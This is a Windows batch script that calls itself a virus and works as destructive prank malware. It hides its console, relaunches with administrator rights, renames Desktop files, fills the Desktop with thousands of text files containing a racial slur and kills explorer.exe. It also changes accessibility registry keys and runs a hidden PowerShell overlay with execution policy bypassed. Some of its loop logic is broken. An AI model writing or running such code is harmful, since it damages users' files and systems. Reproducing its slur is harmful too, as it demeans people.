@echo off
setlocal enabledelayedexpansion

:: Hide the console window immediately (before any prompts)
powershell -WindowStyle Hidden -Command "$signature = '[DllImport(\"user32.dll\")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'; $type = Add-Type -MemberDefinition $signature -Name Win32ShowWindow -Namespace Win32Functions -PassThru; $consolePtr = [System.Diagnostics.Process]::GetCurrentProcess().MainWindowHandle; $type::ShowWindow($consolePtr, 0)" >nul 2>&1

:: First confirmation using message box
powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('WARNING: This script is a virus, If you continue you will continue to a pc destructive program', 'Warning', 'YesNo', 'Warning')" > %temp%\msgbox1.txt
set /p result1=<%temp%\msgbox1.txt
del %temp%\msgbox1.txt

if not "%result1%"=="Yes" (
    powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Operation cancelled by user.', 'Cancelled', 'OK', 'Information')" >nul
    exit /b
)

:: Second warning using message box
powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('FINAL WARNING: Are you absolutely sure you want to proceed?^n^nThis action cannot be undone.', 'Final Warning', 'YesNo', 'Exclamation')" > %temp%\msgbox2.txt
set /p result2=<%temp%\msgbox2.txt
del %temp%\msgbox2.txt

if not "%result2%"=="Yes" (
    powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Operation cancelled by user.', 'Cancelled', 'OK', 'Information')" >nul
    exit /b
)

echo.
echo Proceeding with script...
echo.



net session >nul 2>&1
if %errorlevel% == 0 (
    powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Administrator privileges confirmed!^n^nProceeding with script execution...', 'Admin Check', 'OK', 'Information')" >nul
    echo.
    echo [Rest of script with admin privileges would go here]
    echo.
	ping 127.0.0.1 -n 2 >nul
	set /a count=20

for /l %%i in (1,1,%count%) do (
   start "" "https://www.youtube.com/watch?v=5oIi2M6y7G4&list=RD5oIi2M6y7G4"
   
   cd %USERPROFILE%\Desktop
ren *. *.GOOF

cd %USERPROFILE%\Desktop
for /l %i in (1,1,10000) do echo NIGA > CRYFORMEBOYYYY%i.txt

ping 127.0.0.1 -n 2 >nul

taskkill /f /im explorer.exe
ping 127.0.0.1 -n 4 >nul


:: Set registry keys for inverted color filter (FilterType=1 for invert) - run once
reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v "Configuration" /t REG_SZ /d "colorfiltering" /f
reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\colorfiltering" /v "Active" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\colorfiltering" /v "FilterType" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\ColorFiltering" /v "Active" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\ColorFiltering" /v "FilterType" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\ColorFiltering" /v "HotkeyEnabled" /t REG_DWORD /d 1 /f
call :loop

echo Add-Type -AssemblyName System.Windows.Forms,System.Drawing > %temp%\cursor_trail.ps1
echo $form = New-Object System.Windows.Forms.Form >> %temp%\cursor_trail.ps1
echo $form.Text = 'Cursor Trail Overlay' >> %temp%\cursor_trail.ps1
echo $form.TopMost = $true >> %temp%\cursor_trail.ps1
echo $form.FormBorderStyle = 'None' >> %temp%\cursor_trail.ps1
echo $form.WindowState = 'Maximized' >> %temp%\cursor_trail.ps1
echo $form.BackColor = [System.Drawing.Color]::Magenta >> %temp%\cursor_trail.ps1
echo $form.TransparencyKey = [System.Drawing.Color]::Magenta >> %temp%\cursor_trail.ps1
echo $trails = New-Object System.Collections.Queue >> %temp%\cursor_trail.ps1
echo $icon = [System.Drawing.SystemIcons]::Error >> %temp%\cursor_trail.ps1
echo $timer = New-Object System.Windows.Forms.Timer >> %temp%\cursor_trail.ps1
echo $timer.Interval = 50  # Faster update for smoother trail (~20 FPS) >> %temp%\cursor_trail.ps1
echo $timer.Add_Tick({ >> %temp%\cursor_trail.ps1
echo   $pos = [System.Windows.Forms.Cursor]::Position >> %temp%\cursor_trail.ps1
echo   $trails.Enqueue($pos) >> %temp%\cursor_trail.ps1
echo   if ($trails.Count -gt 20) { $trails.Dequeue() }  # Trail length: 20 icons >> %temp%\cursor_trail.ps1
echo   $form.Invalidate() >> %temp%\cursor_trail.ps1
echo }) >> %temp%\cursor_trail.ps1
echo $form.Add_Paint({ >> %temp%\cursor_trail.ps1
echo   $g = $_.Graphics >> %temp%\cursor_trail.ps1
echo   $i = 0 >> %temp%\cursor_trail.ps1
echo   foreach ($p in $trails.ToArray()) { >> %temp%\cursor_trail.ps1
echo     $alpha = [math]::Max(0, 255 - ($i * 12))  # Fade out effect >> %temp%\cursor_trail.ps1
echo     if ($alpha -gt 0) { >> %temp%\cursor_trail.ps1
echo       $g.DrawIcon($icon, $p.X - $form.Left - 16, $p.Y - $form.Top - 16)  # Offset to center icon >> %temp%\cursor_trail.ps1
echo     } >> %temp%\cursor_trail.ps1
echo     $i++ >> %temp%\cursor_trail.ps1
echo   } >> %temp%\cursor_trail.ps1
echo }) >> %temp%\cursor_trail.ps1
echo $form.Show() >> %temp%\cursor_trail.ps1
echo $timer.Start() >> %temp%\cursor_trail.ps1
echo [System.Windows.Forms.Application]::Run($form) >> %temp%\cursor_trail.ps1
:: Run the PowerShell script hidden
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File %temp%\cursor_trail.ps1

	
) else (
    :: Show message box about needing admin rights
    powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Administrator privileges required!^n^nThe script will now restart with elevated permissions.', 'Admin Required', 'OK', 'Warning')" >nul
    
    :: Re-launch the script with admin rights
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)


:loop
:: Create VBS for key simulation
echo Set WshShell = WScript.CreateObject("WScript.Shell") > %temp%\toggle.vbs
echo WshShell.SendKeys "#^{c}" >> %temp%\toggle.vbs
cscript //nologo %temp%\toggle.vbs
del %temp%\toggle.vbs
:: Wait 2 seconds (using ping for delay)
ping 127.0.0.1 -n 3 >nul  REM 3 pings = ~2 seconds
goto loop
